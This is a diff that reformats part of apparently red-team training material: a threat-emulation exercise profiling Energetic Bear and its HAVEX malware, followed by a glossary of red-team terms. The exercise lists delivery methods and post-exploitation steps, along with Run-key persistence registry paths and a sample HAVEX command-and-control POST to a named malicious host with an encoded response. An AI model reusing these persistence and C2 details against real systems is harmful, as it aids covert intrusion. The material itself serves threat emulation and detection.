@@ -4755,119 +4755,82 @@ your observations to the highlights below.
 Highlights have been provided to help with this process.
 
 #### Highlights from the Energetic Bear Threat Actor
-
-#### ● Starting in 2010 and ending in 2014, Energetic Bear / Dragonfly / Crouching Yeti malware
-
 ```
+● Starting in 2010 and ending in 2014, Energetic Bear / Dragonfly / Crouching Yeti malware
 attacked numerous computers to collect information on industrial control systems in the
 United States and Europe
+● Spread out over time and thus difficult to detect
+● The primary goal was to collect information that impacted the energy and pharmaceutical industries
+● Possibly nation-state supported
+● Phishing, watering hole attacks
+● Known exploits were used (PDF, Java, IE, Word)
+● Compromised ICS web servers
+● HTTP-based C2
+● Specific activities and capabilities
 ```
-#### ● Spread out over time and thus difficult to detect
-
-#### ● The primary goal was to collect information that impacted the energy and pharmaceutical
-
-```
-industries
-```
-#### ● Possibly nation-state supported
-
-#### ● Phishing, watering hole attacks
-
-#### ● Known exploits were used (PDF, Java, IE, Word)
-
-#### ● Compromised ICS web servers
-
-#### ● HTTP-based C2
-
-#### ● Specific activities and capabilities
-
-#### IOCs from the actor Energetic Bear and the HAVEX malware
+IOCs from the actor Energetic Bear and the HAVEX malware
 
 **Actor**
-
-
-#### ● Associated with the Russian Federation
-
-#### ● Active over multiple years
-
-#### ● Active primarily during Moscow business hours
-
-#### ● Targeted organizations based in the industry control system sector vGoal of gathering
-
 ```
-intelligence on ICS-based organizations
+● Associated with the Russian Federation
+● Active over multiple years
+● Active primarily during Moscow business hours
+● Targeted organizations based in the industry control system sector vGoal of gathering intelligence on ICS-based organizations
+● Use of custom malware
 ```
-#### ● Use of custom malware
 
 **Attack and delivery TTPs**
-
-#### ● Phishing
-
-#### ● Watering hole
-
-#### ● Compromised web servers
+```
+● Phishing
+● Watering hole
+● Compromised web servers
+```
 
 **Exploitation TTPs**
-
-#### ● PDF exploits
-
-#### ● Java and IE exploits
-
-#### ● Word exploits2
-
-#### ● Custom binaries
+```
+● PDF exploits
+● Java and IE exploits
+● Word exploits2
+● Custom binaries
+```
 
 **Post-exploitation TTPs**
-
-#### ● Local system enumeration for OS, username, processes, internet history, etc.
-
-#### ● Scan for known ICS-related ports
-
-#### ● DLL injection to migrate into explorer.exe
-
-#### ● Collect Outlook address book information
-
-#### ● Collect passwords from browsers
-
-#### ● Save exfiltrated data to an encrypted file on disk before delivery to the C2 in an HTTP
-
 ```
-POST request
+● Local system enumeration for OS, username, processes, internet history, etc.
+● Scan for known ICS-related ports
+● DLL injection to migrate into explorer.exe
+● Collect Outlook address book information
+● Collect passwords from browsers
+● Save exfiltrated data to an encrypted file on disk before delivery to the C2 in an HTTP POST request
 ```
-**Persistence TTPs**
-Run key registry modifications:
 
+**Persistence TTPs**  
+Run key registry modifications:  
 ```
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"TmProvider"
-```
-```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"TmProvider"
-```
-```
 HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Internet Explorer\InternetRegistry\"fertger"
-```
-```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\InternetRegistry
 ```
 
 **HAVEX Payload Delivery**
 
 ```
-Energetic Bear used
-three major methods to deliver malware.
+Energetic Bear used three major methods to deliver malware.
 1) Malicious PDF via spear-phishing Spear-phishing was used to infect targeted individuals
 for initial information gathering by delivering malicious PDF documents—in this case,
 PDF/SWF exploits targeting CVE-2011-0611 to drop malware.3 Even with this running
-through 2014, older exploits were still valuable.
+through 2014, older exploits were still valuable.  
 2) Malicious JAR and HTML via a watering hole attackWatering hole attacks were used to
 deliver Backdoor.Oldrea by Symantec. These attacks exploited CVE-2013-2465, CVE-
 2013-1347, and CVE-2012-1723 in Java 6, Java 7, IE 7, and IE 8 to drop the HAVEX
 malware. The exploits appeared to be modified Metasploit Java exploits built to deliver
-the HAVEX loader.
+the HAVEX loader.  
 3) Legitimate software loaders Energetic Bear compromised several legitimate ICS vendor
 websites. Binaries such as camera drivers and PLC management software were modified
 and made to deliver the HAVEX malware.
 ```
+
 In order to complete the third attack type, the threat actor had to compromise several ICS vendors’
 websites. Sometimes called a Strategic Web Compromise (SWC) attack, these have become a
 favorite attack method from Russian and Chinese-based threats. In this case, SWC attacks were used
@@ -4877,24 +4840,25 @@ these three attack types demonstrated an organized and arguably sophisticated th
 behind this planned and organized a scenario to be successful against its target audience.
 
 Once malware was delivered, three major tasks were observed:
-● System enumeration tools collected information, such as the OS version, machine name and
-username, and file and directory listings.
+```
+● System enumeration tools collected information, such as the OS version, machine name and username, and file and directory listings.  
 ● A credential-harvesting tool extracted stored passwords from various web browsers.
-● Secondary implants6 communicated with different C2 infrastructures using custom
-protocols and payloads executed in memory.
+● Secondary implants6 communicated with different C2 infrastructures using custom protocols and payloads executed in memory.
+```
 
-**HAVEX HTTP Request Sample
+**HAVEX HTTP Request Sample  
 POST Request**
-POST /wp08/wp-includes/dtcla.php?id=285745296322896178920098FD80-
-20&v1=038&v2=170393861&q=5265882854508EFCF958F979E4 HTTP/1.1
+```
+POST /wp08/wp-includes/dtcla.php?id=285745296322896178920098FD80-20&v1=038&v2=170393861&q=5265882854508EFCF958F979E4 HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)
 AppleWebKit/525.19(KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19
 Host: toons.freesexycomics.com
 Content-Length: 0
 Cache-Control: no-cache
-
+```
 
 **Post Response**
+```
 HTTP/1.1 200 OK
 Date: Wed, 22 Jan 2014 13:40:48 GMT
 Content-Type: text/html
@@ -4903,7 +4867,6 @@ Connection: keep-alive
 Server: Apache/1.3.37 (Unix)
 Cache-Control: no-cache
 
-```
 9f65
 <html><head><mega http-equiv=’CACHE-CONTROL’ content=’NO-CACHE’></head><body>No data!<!--
 havexQlpoOTFBWSZTWWYvDI0BOsD/////////////////////////////////////////////4oB+93VVXu69DuN7XYzds9yt49Ques
@@ -4911,25 +4874,23 @@ havexQlpoOTFBWSZTWWYvDI0BOsD/////////////////////////////////////////////4oB+93V
 +yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD
 M92D/8XckU4UJBmLwyNA==havex--></body></head>
 ```
+
 In this example from Symantec, several indicators can be identified.
 
 The POST request shows several indicators that may be incorporated into an emulated threat:
-
-#### ● A target PHP file (dtcla.php)
-
-#### ● Interesting URL parameters (id, v1, v2, q)
-
-#### ● A potentially interesting User-Agent
-
-#### ● A target host
+```
+● A target PHP file (dtcla.php)
+● Interesting URL parameters (id, v1, v2, q)
+● A potentially interesting User-Agent
+● A target host
+```
 
 Like the request, the response has several indicators:
-
-#### ● A server header
-
-#### ● A potentially unique ID (9f65)
-
-#### ● Base64-encoded data stored between text (havex < base64 > havex)
+```
+● A server header
+● A potentially unique ID (9f65)
+● Base64-encoded data stored between text (havex < base64 > havex)
+```
 
 Note: MALWAREMUSTDIE2 posted a great write-up on the HAVEX malware. This provides
 additional examples of C2 source code and HTTP request/response pairs. Reference:
@@ -4943,31 +4904,28 @@ wrong answer. The important components of a threat profile are technical feasibi
 engagement goals, and ability to implement using your Red Team’s tools and ability.
 
 Tips
-● Profiles must be technically feasible. If your profile calls for the use of zero-days, make
-sure you can deliver. (white carding and assumed breach models may help)
-● Threat profiles are implemented as part of the C2 plan. They directly influence the
-selection and configuration of C2. Always consider the technical capabilities and
-limitations of your C2 platforms when designing a profile
+```
+● Profiles must be technically feasible. If your profile calls for the use of zero-days, make sure you can deliver. (white carding and assumed breach models may help)  
+● Threat profiles are implemented as part of the C2 plan. They directly influence the selection and configuration of C2. Always consider the technical capabilities and limitations of your C2 platforms when designing a profile  
 2) Develop your profile using the following template then compare to the possible solution.
-
+```
 
 ### Possible Solution
 
 **Think about the following questions:**
 
-How does your solution compare?
+How does your solution compare?  
 
-Do you have the technical ability to execute this profile?
+Do you have the technical ability to execute this profile?  
 
-Did you copy the exact techniques from the reference example, or did you fill in the gaps with other
-techniques?
+Did you copy the exact techniques from the reference example, or did you fill in the gaps with other techniques?  
 
-Are you prepared to explore unfamiliar techniques to better mimic the reference example?
+Are you prepared to explore unfamiliar techniques to better mimic the reference example?  
 
 
 ## Glossary of Terms
 
-**Assumed Breach**
+**Assumed Breach**  
 The Assumed Breach Model assumes a threat has some level of access to a target at the initiation of
 the engagement.
 
@@ -4979,19 +4937,19 @@ threats must prove they can get in before beginning. When is the proof important
 if measuring the ability a threat has to "get in" is important. If this is not a key goal, using the Assumed
 Breach Model will save time and money. It will free the Red Team to explore higher impact goals.
 
-**Blue Cell**
+**Blue Cell**  
 The blue cell is the opposite side of red. Is it all the components defending a target network. The blue
 cell is typically comprised of blue team members, defenders, internal staff, and an organization’s
 management.
 
-**Blue Team**
+**Blue Team**  
 A security team that defends against threats.
 
-**Command and Control (C2)**
+**Command and Control (C2)**  
 Command and Control (C2) is the influence an attacker has over a compromised computer system that
 they control.
 
-**C2 Tiers**
+**C2 Tiers**  
 Designing a robust C2 infrastructure involves creating multiple layers of Command and Control.
 These can be described as tiers. Each tier offers a level of capability and covertness. The idea of
 using multiple tiers is the same as not putting all your eggs in one basket. If C2 is detected and
@@ -5001,8 +4959,8 @@ C2 tiers generally fall into three categories: Interactive, Short Haul, and Long
 sometimes labeled as Tier 1, 2, or 3. There is nothing unique to each tier other than how they are to be
 used.
 
-```
 Interactive tier
+```
 ● Used for general commands, enumeration, scanning, data exfiltration, etc.
 ● This tier has the most interaction and is at the greatest risk of exposure.
 ● Plan to lose access from communication failure, agent failure, or Blue Team actions.
@@ -5011,79 +4969,76 @@ mean blasting the client with packets. Use good judgment to minimize interaction
 enough to perform an action.
 ```
 
-```
 Short haul tier
-```
 ```
 ● Used as a backup to reestablish interactive sessions.
 ● Use covert communications that blend in with the target.
 ● Slow callback times. Callback times in the 1–24 hr. range are common.
 ```
-```
+
 Long haul tier
 ```
 - The same as Short Haul but even lower and slower.
 - Slow callback times. Callback times of 24+ hours are common.
+```
 
-**Deconfliction**
+**Deconfliction**  
 Deconfliction is the ability to identify which activity is generated by a Red Team and which is not. In
 general, the deconfliction provide a way to separate Red Team activity from real-world activity
 through a controlled process.
 
-**Engagement / Exercise Control Group (ECG)**
+**Engagement / Exercise Control Group (ECG)**  
 The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted
 during the engagement. Most often, the Engagement Control Group is composed of one or two senior
 managers from the target environment (for example a Chief Information Officer or Chief Operating
 Officer), one member from the Information Technology department of the environment, a White Cell
 liaison, and a Red Team liaison. More may be added as required. All must be Trusted Agents.
 
-**Exfiltration**
+**Exfiltration**  
 Exfiltration is the extraction of information from a target. This is typically through a covert channel.
 
-**Get In, Stay In, Act**
+**Get In, Stay In, Act**  
 The three main phases of a Red Team engagement.
 
 ```
-Get In
+Get In  
 Gain access to a network. The Red Team must have access to their target. Access can be
 through a legitimate compromise or access is directly granted as part of an assumed breach
 scenario, such as an insider threat scenario
 ```
 ```
-Stay In
+Stay In  
 Establish persistence or a permanent presence. Red Team engagements are typically longer
 than other types of tests. A Red Team usually establishes persistence or a permanent
 presence in order to survive the duration of the engagement.
 ```
 ```
-Act
+Act  
 Phase where a Red Team performs operational impacts against a target.
 ```
-**IOC (Indicator of Compromise)**
+**IOC (Indicator of Compromise)**  
 Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions.
 
 
-##### OPFOR
-
+**OPFOR**  
 An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios.
 Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios.
 
-**OPLOG (Operator Log)**
+**OPLOG (Operator Log)**  
 Operator logs are the records generated by Red Team operators during an engagement. These logs
 have specific and required fields that must be captured.
 
-**Operational Impact**
+**Operational Impact**  
 An operational impact is the effect of a goal-driven action within a target environment.
 
-##### OPSEC
-
+**OPSEC**  
 OPSEC or Operational Security is a process that identifies critical information to determine if
 friendly actions can be observed by enemy intelligence, determines if information obtained by
 adversaries could be interpreted to be useful to them, and then executes selected measures that
 eliminate or reduce adversary exploitation of friendly critical information. In terms of Red Teaming,
 it is understanding what actions Blue can observe and minimizes exposure.
 
-**Outbrief, Executive**
+**Outbrief, Executive**  
 The first post-engagement meeting is usually the executive outbrief. An executive brief is typically
 performed soon after execution completes (within one or two days following execution). This meeting
 is tailored toward management and should include key personnel from the target organization. The
@@ -5092,81 +5047,79 @@ potentially requiring funding to pursue mitigations or staffing modifications. M
 and buy-in are critical if Red Team results will be used to improve an organization's security stance
 to defend and respond to a threat.
 
-**Outbrief, Technical**
+**Outbrief, Technical**  
 The technical outbrief (aka a tech-on-tech) is a bi-directional technical exchange of information
 between the Red Team, the Blue Team, and the organization. During this exchange, both the Red and
 the defensive elements provide a highly detailed, step-by-step technical review of the actions and
 results (including all associated details) of the engagement. This is where training and education meet
 and is one of the most valuable opportunities for all parties to learn.
 
-**Persistence**
+**Persistence**  
 Persistence is the ability or techniques used to establish a permanent presence in order to survive the
 duration of the engagement.
 
-**Prepositioning**
+**Prepositioning**  
 Prepositioning is the process of using the access and capabilities gained during an engagement to best
 position an operator for the execution of an impact.
 
-**Red Cell**
+**Red Cell**  
 The term red cell is borrowed from the military. It is commonly associated with a group that plays
-
-
 OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the
 offensive portion of a red team engagement that simulates the strategic and tactical responses of a
 given target. The red cell is typically comprised of red team leads and operators and is commonly
 referred to as Red Team instead of Red Cell.
 
-**Red Team**
+**Red Team**  
 A Red Team is an independent group that, from the perspective of a threat or adversary, explores
 alternative plans and operations to challenge an organizatioøn to improve its effectiveness.
 
-**Red Team Lead**
+**Red Team Lead**  
 Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget,
 and resource management for the Red
 Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures
 adherence to all laws, regulations, policies, and Rules of Engagement.
 
-**Red Team Operator**
+**Red Team Operator**  
 Complies with all Red Team requirements under the direction of the Red Team Lead. Operational
 executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research
 and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides
 log and information support for creation of the final report
 
-**Rules of Engagement (ROE)**
+**Rules of Engagement (ROE)**  
 The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red
 Team, the customer, the system owner, and any stakeholders required for engagement execution.
 
-**Situational Awareness**
+**Situational Awareness**  
 Situational awareness is a step in a Red Team engagement used gather as much information as needed
 on the targets and target environment. The information gathered is used to determine the next actions
 towards privilege escalation, lateral movement, or other steps. It is is a key component to Red
 Teaming and should be performed to some level on all access targets.
 
-**Threat**
+**Threat**  
 A threat is an expression of intention to inflict evil, injury, or damage.
 
-**Threat Emulation**
+**Threat Emulation**  
 Threat Emulation Threat Emulation is the process of mimicking the TTPs of a specific threat.
 
-**Threat Intelligence**
+**Threat Intelligence**  
 Threat intelligence is information that has been aggregated, transformed, analyzed, interpreted, or
 enriched to provide the context for decision-making processes regarding threats.
 
-**Threat Model**
+**Threat Model**  
 A threat model is the process by which potential threats or the absence of appropriate safeguards, can
 be identified, enumerated, and mitigations can be prioritized.
 
 
-**Threat Perspective**
+**Threat Perspective**  
 a Threat's Perspective is the threat's initial point of view. This perspective is used to build and shape
 a threat profile or scenario. A threat's perspective may be that of an outsider, nearsider, or insider.
 
-**Threat Profile**
+**Threat Profile**  
 A threat profile is used to establish the rules as to how a Red Team will act and operate. These rules
 serve as a roadmap for a Red Team by guiding how and what type of actions should be performed.
 Threat profiles are a key part of developing and designing C2 early in Red Team planning.
 
-**Threat Scenario**
+**Threat Scenario**  
 Scenarios provide insight into how a defensive solution will perform and conform to the processes,
 procedures, policies, activities, personnel, organizations, environment, threats, constraints,
 assumptions, and support involved in the security mission. Scenarios generally describe the role of
@@ -5175,11 +5128,11 @@ elicits real-world truth of how essential internal practices are employed. In sh
 target's security operations would dynamically perform an action to deliver results, outputs, or prove
 capability.
 
-**Tradecraft**
+**Tradecraft**  
 Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the
 intelligence community. TTPs and Tradecraft are used interchangeably in this course.
 
-**Trusted Agent (TA)**
+**Trusted Agent (TA)**   
 The Trusted Agent’s primary role is to limit irreversible damage and risk to life, limb, eyesight, and
 equipment; however, they are more often used to prevent the defenders from causing unexpected self-
 inflicted damage.
@@ -5187,20 +5140,21 @@ A Trusted Agent (TA) has privileged and detailed knowledge of engagement activit
 conditions, and the engagement status that would unduly bias or influence the actions of the
 environment staff and defenders. A Trusted Agent must protect all information from being provided to
 any party without the express approval of the Engagement Control Group.
-**TTPs**
+
+**TTPs**  
 TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures).
 
-**Two Person Integrity (TPI)**
+**Two Person Integrity (TPI)**  
 Two-person integrity is used to verify activities performed during the engagement and should be
 maintained at all times. A team member should review, understand, and provide a “sanity check” for
 each action/command performed. TPI reduce personal and engagement risks.
 
-**Web Shell**
+**Web Shell**  
 A web shell is a piece of web code that is placed on an Web server to allow an adversary to use the
 Web server as a gateway into a network. Web shells are commonly deployed as part of an application
 security attack.
 
-**White Cell**
+**White Cell**  
 Serves as referee between Red Team activities and defender responses during an engagement.
 
 
